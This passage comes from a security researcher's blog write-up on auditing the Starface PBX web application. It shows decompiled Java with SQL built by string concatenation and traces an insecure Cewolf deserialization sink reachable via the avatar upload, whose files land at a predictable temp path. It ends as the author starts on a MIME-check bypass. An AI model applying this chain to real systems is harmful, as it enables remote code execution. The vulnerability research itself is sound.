class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;TimeRange&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;selectedTimeRange&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SQLException&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/*  196 */&lt;/span&gt;     &lt;span class=&quot;nc&quot;&gt;StringBuffer&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;StringBuffer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/*      */&lt;/span&gt;     
+&lt;span class=&quot;cm&quot;&gt;/*  198 */&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;SELECT c.id, callid, callleguuid, calleraccountid, callercallerid, calledaccountid, calledcallerid,&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/*  199 */&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot; starttime, ringingtime, linktime, callresulttime, callresult, lineid, wirename, linename,&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/*  200 */&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot; incoming, answered, duration, a1.login AS callerlogin, a2.login AS calledlogin&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/*      */&lt;/span&gt;     
+&lt;span class=&quot;o&quot;&gt;[...]&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/*  220 */&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot; ORDER BY callid, starttime&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/*      */&lt;/span&gt;     
+&lt;span class=&quot;cm&quot;&gt;/*  222 */&lt;/span&gt;     &lt;span class=&quot;nc&quot;&gt;Statement&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stmt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;con&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;createStatement&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/*      */&lt;/span&gt;     
+&lt;span class=&quot;cm&quot;&gt;/*  224 */&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;stmt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setFetchSize&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/*  225 */&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stmt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;executeQuery&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/*      */&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Well, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;grep&lt;/code&gt; worked just fine but the method parameters were not used at all. Even if they’d have been used with concatenation to build the SQL string buffer, they were mainly &lt;em&gt;number formats&lt;/em&gt;. I.e. you could expect something like a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NumberFormatException&lt;/code&gt; before anything would have hit your SQL query execution.&lt;/p&gt;
+
+&lt;p&gt;What about this method?&lt;/p&gt;
+
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cm&quot;&gt;/*      */&lt;/span&gt;   &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;deleteFromVoicemailTable&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;voicemailListId&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cdrid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SQLException&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/*  576 */&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;con&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/*      */&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/*  578 */&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;con&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getConnection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/*  579 */&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;con&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setAutoCommit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/*  580 */&lt;/span&gt;       &lt;span class=&quot;nc&quot;&gt;Statement&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stmt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;con&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;createStatement&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/*  581 */&lt;/span&gt;       &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;StringUtils&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;isNotBlank&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;voicemailListId&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/*  582 */&lt;/span&gt;         &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;DELETE FROM cdrvoicemail WHERE id=&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;voicemailListId&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/*  583 */&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;stmt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;executeUpdate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sql&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/*  584 */&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;stmt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;clearBatch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/*  585 */&lt;/span&gt;         &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sql1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;DELETE FROM cdrtovoicemail WHERE idcdrvoicemail=&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;voicemailListId&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/*  586 */&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;stmt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;executeUpdate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sql1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/*  587 */&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;stmt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;clearBatch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/*  588 */&lt;/span&gt;         &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sql2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;DELETE FROM cdrsummarytovoicemail WHERE idcdrvoicemail=&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;voicemailListId&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/*      */&lt;/span&gt;         
+&lt;span class=&quot;cm&quot;&gt;/*  590 */&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;stmt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;executeUpdate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sql2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[...]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This looked a lot better to me, didn’t it? Now, you could use the &lt;strong&gt;Call Hierarchy&lt;/strong&gt; function of Eclipse to search your way up to potentially controlled user input.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/auditfails/sqlcallhierarchy.png&quot; alt=&quot;Call Hierarchy&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I didn’t find a quick win, yet. But again feel free to hack with me together for some code audit fun purposes.&lt;/p&gt;
+
+&lt;p&gt;A week later I stumbled over another idea, triggered by one of my &lt;em&gt;Bottom-Up&lt;/em&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;grep&lt;/code&gt;s: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;readObject()&lt;/code&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;de/laures/cewolf/storage/FileStorage.java&lt;/code&gt;. I instantly remembered a cool exploit by &lt;em&gt;mr_me&lt;/em&gt; for &lt;strong&gt;ManageEngine Desktop Central&lt;/strong&gt;. There was an insecure deserialization issue described at his &lt;a href=&quot;https://srcincite.io/pocs/src-2020-0011.py.txt&quot;&gt;website&lt;/a&gt;. It used the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;de.laures.cewolf.CewolfRenderer&lt;/code&gt; to achieve RCE after uploading a malicious file.&lt;/p&gt;
+
+&lt;p&gt;I had a look again in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;web.xml&lt;/code&gt; file to check if there were any URL patterns triggering this Servlet. I found this:&lt;/p&gt;
+
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[...]
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;CewolfServlet&lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-class&amp;gt;&lt;/span&gt;de.laures.cewolf.CewolfRenderer&lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-class&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;load-on-startup&amp;gt;&lt;/span&gt;1&lt;span class=&quot;nt&quot;&gt;&amp;lt;/load-on-startup&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet&amp;gt;&lt;/span&gt;
+[...]
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-mapping&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;CewolfServlet&lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;url-pattern&amp;gt;&lt;/span&gt;/config/statistic/statrender/*&lt;span class=&quot;nt&quot;&gt;&amp;lt;/url-pattern&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-mapping&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Alright, I thought, let’s be sure first that the same insecure deserialization code was available in the library used by Starface: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;de.laures.cewolf.CewolfRenderer.doGet(HttpServletRequest, HttpServletResponse)&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[...]&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/* 135 */&lt;/span&gt;     &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;imgKey&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getParameter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;img&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/* 136 */&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;imgKey&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/*     */&lt;/span&gt;       
+&lt;span class=&quot;cm&quot;&gt;/* 138 */&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;logAndRenderException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ServletException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;no 'img' parameter provided for Cewolf servlet.&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;height&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/*     */&lt;/span&gt;       &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/*     */&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 
+&lt;span class=&quot;cm&quot;&gt;/* 141 */&lt;/span&gt;     &lt;span class=&quot;nc&quot;&gt;Storage&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;storage&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getStorage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/* 142 */&lt;/span&gt;     &lt;span class=&quot;nc&quot;&gt;ChartImage&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chartImage&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;storage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getChartImage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;imgKey&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[...]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;imgKey&lt;/code&gt; we controlled, indeed. And we also found the code &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;de.laures.cewolf.storage.FileStorage.getChartImage(String, HttpServletRequest)&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cm&quot;&gt;/*     */&lt;/span&gt;   &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ChartImage&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getChartImage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;HttpServletRequest&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/* 108 */&lt;/span&gt;     &lt;span class=&quot;nc&quot;&gt;ChartImage&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/* 109 */&lt;/span&gt;     &lt;span class=&quot;nc&quot;&gt;ObjectInputStream&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ois&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/*     */&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/* 111 */&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;ois&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ObjectInputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;FileInputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getFileName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)));&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/* 112 */&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;ChartImage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ois&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;readObject&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/* 113 */&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;ois&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/* 114 */&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ex&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/* 115 */&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;ex&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;printStackTrace&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/*     */&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[...]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nice! &lt;strong&gt;But&lt;/strong&gt; I of course needed a upload function letting me store a malicious serialized object into a file with a specific path (or I could have controlled the path to). So I focused on the most obvious file upload: &lt;strong&gt;upload an avatar for my profile&lt;/strong&gt;. Logged in as an unprivileged user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0002&lt;/code&gt; again, I searched and found the profile function quickly.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/auditfails/profileUI.png&quot; alt=&quot;Profile UI&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I started with a valid image borrowed from my favorite fake profile contributor &lt;a href=&quot;https://thispersondoesnotexist.com/&quot;&gt;https://thispersondoesnotexist.com/&lt;/a&gt;. I observed a POST request to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://192.168.2.103/frontend/preferences/display/data/avatar/upload.do?token=[...]&lt;/code&gt; with &lt;strong&gt;multipart/form-data&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/auditfails/profilemultiform.png&quot; alt=&quot;Profile Multi Form&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Interestingly, the response contained a download link for the image as well&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;table&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;style=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;background-image: url('/download/starface1604513874694340454.jpeg?key=Su2UMZiXNl3Koo6swU487M7q6CN6gP');&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;and guess what: the same file name was found on the VM’s file system at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/cache/tomcat/temp/starface1604513874694340454.jpeg&lt;/code&gt;. So from the response we could tell where a file landed and what it’s name would be. Exactly what we needed. But we were not there, yet. We wanted to upload something malicious, right?&lt;/p&gt;
+
+&lt;p&gt;We started with something obvious, a &lt;strong&gt;JSP file&lt;/strong&gt; but all we got was an error:
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;File has wrong MIME type, must be one of image/png, image/jpeg, image/gif&lt;/code&gt;.
+But a new file was created at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/cache/tomcat/temp/starface7442021089817434947.jsp&lt;/code&gt; with the JSP code content. Unfortunately, we didn’t get the &lt;em&gt;download link&lt;/em&gt; in the response if an error occurred. But I was on fire, motivation high, so I thought: &lt;strong&gt;let’s bypass this MIME type check&lt;/strong&gt;.&lt;/p&gt;
+
